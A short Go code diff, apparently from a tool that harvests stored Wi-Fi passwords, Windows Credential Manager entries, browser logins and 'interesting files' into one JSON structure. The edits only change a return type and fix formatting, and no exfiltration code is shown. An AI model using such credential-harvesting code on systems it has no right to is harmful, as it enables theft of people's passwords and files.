@@ -29,7 +29,7 @@ func ExtractWifiData() ([]common.NamePass, int) {
 	return nil, 0
 }
 
-func ExtractCredmanData() ([]common.NamePass, int) {
+func ExtractCredmanData() ([]common.UrlNamePass, int) {
 	var windowsResult = windows.CredManModuleStart()
 	if windowsResult.Success {
 		return windowsResult.Data, len(windowsResult.Data)
@@ -37,7 +37,7 @@ func ExtractCredmanData() ([]common.NamePass, int) {
 	return nil, 0
 }
 
-func ExtractInterestingFiles() []string{
+func ExtractInterestingFiles() []string {
 	var data = filesystem.FindFiles()
 	return data
 }
@@ -45,7 +45,7 @@ func ExtractInterestingFiles() []string{
 type AllDataStruct struct {
 	WifiData    []common.NamePass    `json:"wifi"`
 	BrowserData []common.UrlNamePass `json:"browser"`
-	CredmanData []common.NamePass    `json:"credman"`
+	CredmanData []common.UrlNamePass `json:"credman"`
 }
 
 func ExtractAllData() (AllDataStruct, int) {
